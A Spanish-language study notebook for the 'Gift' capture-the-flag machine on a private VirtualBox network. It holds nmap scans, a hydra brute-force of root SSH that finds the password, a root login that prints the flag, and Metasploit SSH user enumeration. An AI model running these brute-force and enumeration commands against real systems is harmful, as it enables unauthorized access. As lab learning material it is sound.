Parte de [[Maquinas]] y [[Enumeracion de Servicios]]

>1. Barrido de exploracion desde 192.168.56.100 a la 192.168.56.254

``` bash
sudo nmap -sn 192.168.56.100/24
```

Otra opcion:

``` bash
sudo nmap -sn 192.168.56.100-254
```

Salida (de la primera opcion):

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 20:41 CET
Nmap scan report for 192.168.56.1
Host is up (0.00020s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.0010s latency).
MAC Address: 08:00:27:02:65:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up (0.00077s latency).
MAC Address: 08:00:27:7B:8B:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.103
Host is up (0.00072s latency).
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.11 seconds
```

La IP de la maquina Gift es 192.168.56.103 (ya que 102 es metasploitable)

Otras opciones serian:

``` bash
sudo arp-scan -I eth1 192.168.56.100-192.168.56.254
sudo netdiscover -i eht1 -r 192.168.56.0/24
```

Netdiscover tambien puede trabajar en modo pasivo

> 2. Escaneo de puertos:

``` bash
sudo nmap -n -Pn -sV -O -p- 192.168.56.103 -oN nmap_output.txt
```

Salida:

``` java
Nmap scan report for 192.168.56.103
Host is up (0.0015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```

---

## Prueba propia para resolución

Ataque de fuerza bruta a ssh

Comando:

``` bash
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.56.103:22
```

Salida:

``` java
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-16 17:48:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.56.103:22/
[22][ssh] host: 192.168.56.103   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-16 17:48:29
```

La contraseña es "simple" con lo que podemos conectarnos a root por ssh:

``` bash
ssh root@192.168.56.103

The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.103' (ED25519) to the list of known hosts.
root@192.168.56.103's password: 

IM AN SSH SERVER

gift:~# ls
root.txt  user.txt

gift:~# cat root.txt
HMVtyr543FG
```

---

Siguiendo la parte de clase, exploracion completa de gift:

``` bash
sudo nmap -n -Pn -sS -sV -sC -O -p- 192.168.56.103 -oA gift_fullscan
```

Salida:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 18:45 CET
Nmap scan report for 192.168.56.103
Host is up (0.00082s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
```

La maquina tiene un servicio SSH en el puerto 22 y un puerto HTTP en el puerto 80 hosteando la siguiente informacion:

``` bash
curl http://192.168.56.103:80

Dont Overthink. Really, Its simple.
	<!-- Trust me -->

```

Procedemos con la enumeracion del servicio SSH:

Con nmap:

```bash
sudo nmap -n -Pn --script ssh-auth-methods.nse -p 22 192.168.56.103
```

Salida:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 18:55 CET
Nmap scan report for 192.168.56.103
Host is up (0.00048s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     password
|_    keyboard-interactive
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Se permite salida por contraseña y clave

Tambien podemos utilizar enumeracion de usuarios (inherente de OpenSSH <7.7) mediante un modulo auxiliar de metasploit:

Con el comando help de msf podemos ver los comandos que tenemos como opcion en cada situacion en la que estemos.

Buscamos el modulo de enumeracion:

```bash
search scanner ssh
```

Y usamos enumusers:

``` bash
msf6 > use auxiliary/scanner/ssh/ssh_enumusers 
[*] Using action Malformed Packet - view all 2 actions with the show actions command
msf6 auxiliary(scanner/ssh/ssh_enumusers) > show options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_FALSE   true             no        Check for false positives (random username)
   DB_ALL_USERS  false            no        Add all users in the current database to the list
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][.
                                            ..]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/
                                            using-metasploit/basics/using-metasploit.html
   RPORT         22               yes       The target port
   THREADS       1                yes       The number of concurrent threads (max one per host)
   THRESHOLD     10               yes       Amount of seconds needed before a user is considered foun
                                            d (timing attack only)
   USERNAME                       no        Single username to test (username spray)
   USER_FILE                      no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet



View the full module info with the info, or info -d command.
```

Configuramos RHOSTS a 192.168.56.103:

``` bash
set RHOSTS 192.168.56.103
```

